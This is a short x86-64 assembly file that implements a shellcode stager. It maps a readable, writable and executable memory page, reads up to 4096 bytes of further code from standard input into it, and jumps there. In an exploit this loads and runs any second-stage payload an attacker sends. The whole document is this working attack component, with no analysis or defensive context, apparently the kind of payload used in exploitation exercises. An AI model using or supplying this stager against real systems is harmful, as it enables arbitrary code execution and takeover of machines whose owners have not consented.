        .intel_syntax noprefix
        .globl _start
_start:
        xor r9, r9
        push -1
        pop r8
        push 0x22          /* MAP_PRIVATE | MAP_ANONYMOUS */
        pop r10
        push 0x7           /* PROT_READ | PROT_WRITE | PROT_EXEC */
        pop rdx
        push 1
        pop rsi
        shl rsi, 12
        mov rdi, r9
        push 9             /* mmap */
        pop rax
        syscall
        mov rdx, rsi
        mov rsi, rax
        xor rax, rax       /* read */
        syscall
        jmp rsi
